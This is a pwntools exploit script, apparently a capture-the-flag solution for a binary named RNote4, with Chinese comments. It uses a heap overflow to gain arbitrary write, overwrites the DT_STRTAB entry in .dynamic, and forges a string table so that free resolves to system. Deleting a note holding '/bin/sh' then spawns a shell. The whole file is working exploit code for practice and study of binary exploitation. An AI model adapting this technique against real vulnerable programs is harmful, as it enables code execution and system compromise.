# -*- coding:utf-8 -*-

from pwn import *

context.log_level = 'debug'

p = process("./RNote4")

def Add_note(size,content):
	p.send('\x01')
	p.send(chr(size))
	p.send(content)

def Delete_note(index):
	p.send('\x03')
	p.send(chr(index))

def Edit_note(index,size,content):
	p.send("\x02")
	p.send(chr(index))
	p.send(chr(size))
	p.send(content)

if __name__=='__main__':

'''
 ret2dl-resolve 利用,改写.dynamic的DT_STRTAB

'''
	Add_note(0x18,'a'*0x18)
	Add_note(0x18,'b'*0x18)
	Add_note(0x8,'/bin/sh\x00')
	
	payload = 'a'*0x18+p64(0x21)+p64(0x18)+p64(0x601eb0) #0x601eb0里面保存着符号字符串表的地址,
	'''
	如何获取该地址：通过readelf -s ./RNote4 获取.dynamic和.dynstr的地址，在.dynamic附近搜索.dynstr的地址，.dynstr对应DT_STRTAB,为符号字符串表的地址
	'''

	gdb.attach(p)
	pause()
	Edit_note(0,len(payload),payload) #堆溢出，可在任意地址写
	
	content = p64(0x602100) #将符号字符串的地址改写成0x602100
	Edit_note(1,len(content),content)
#################
	payload = 'a'*0x18+p64(0x21)+p64(0x18)+p64(0x602100)#在0x602100上伪造字符串表
	Edit_note(0,len(payload),payload)
	
	
	content = 'a'*0x5f + 'system\x00' #0x5f为free字符串到字符串表起始位置的偏移，将free字符串改成system
	Edit_note(1,len(content),content)

	Delete_note(2) #触发system("/bin/sh")
	p.interactive()

